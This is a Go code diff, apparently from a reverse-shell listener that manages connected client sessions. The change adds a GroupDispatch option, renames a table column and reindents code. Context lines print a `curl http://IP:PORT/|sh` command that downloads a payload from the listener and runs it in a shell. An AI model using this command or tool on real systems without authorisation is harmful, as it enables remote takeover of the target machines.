@@ -16,20 +16,22 @@ import (
 )
 
 type TCPServer struct {
-	Host      string
-	Port      uint16
-	Clients   map[string](*TCPClient)
-	TimeStamp time.Time
-	Stopped   chan struct{}
+	Host          string
+	GroupDispatch bool
+	Port          uint16
+	Clients       map[string](*TCPClient)
+	TimeStamp     time.Time
+	Stopped       chan struct{}
 }
 
 func CreateTCPServer(host string, port uint16) *TCPServer {
 	return &TCPServer{
-		Host:      host,
-		Port:      port,
-		Clients:   make(map[string](*TCPClient)),
-		TimeStamp: time.Now(),
-		Stopped:   make(chan struct{}, 1),
+		Host:          host,
+		Port:          port,
+		GroupDispatch: true,
+		Clients:       make(map[string](*TCPClient)),
+		TimeStamp:     time.Now(),
+		Stopped:       make(chan struct{}, 1),
 	}
 }
 
@@ -65,16 +67,16 @@ func (s *TCPServer) Run() {
 			// if ip != nil {
 			// 	log.Warn("\t`curl http://%s:%d/|sh`", ip, s.Port)
 			// 	continue
-			// } 
+			// }
 			switch v := addr.(type) {
 			case *net.IPNet:
-					// ipv4
-					if addr.(*net.IPNet).IP.To4() != nil {
-						log.Warn("\t`curl http://%s:%d/|sh`", v.IP, s.Port)
-						break
-					}
-					// ipv6 is not used currently
-					// log.Warn("\t`curl http://[%s:%d]/|sh`", v.IP, s.Port)
+				// ipv4
+				if addr.(*net.IPNet).IP.To4() != nil {
+					log.Warn("\t`curl http://%s:%d/|sh`", v.IP, s.Port)
+					break
+				}
+				// ipv6 is not used currently
+				// log.Warn("\t`curl http://[%s:%d]/|sh`", v.IP, s.Port)
 			}
 		}
 	}
@@ -176,7 +178,7 @@ func (s *TCPServer) AsTable() {
 			(*s).Port,
 			len((*s).Clients),
 		))
-		t.AppendHeader(table.Row{"Hash", "Network", "OS", "User", "Time", "Group"})
+		t.AppendHeader(table.Row{"Hash", "Network", "OS", "User", "Time", "GroupDispatch"})
 
 		for chash, client := range s.Clients {
 			t.AppendRow([]interface{}{
@@ -185,7 +187,7 @@ func (s *TCPServer) AsTable() {
 				client.OS.String(),
 				client.User,
 				humanize.Time(client.TimeStamp),
-				client.Group,
+				client.GroupDispatch,
 			})
 
 		}
@@ -254,6 +256,7 @@ func (s *TCPServer) Stop() {
 }
 
 func (s *TCPServer) AddTCPClient(client *TCPClient) {
+	client.GroupDispatch = s.GroupDispatch
 	s.Clients[client.Hash] = client
 	log.Info("Gathering information from client...")
 	client.DetectOS()
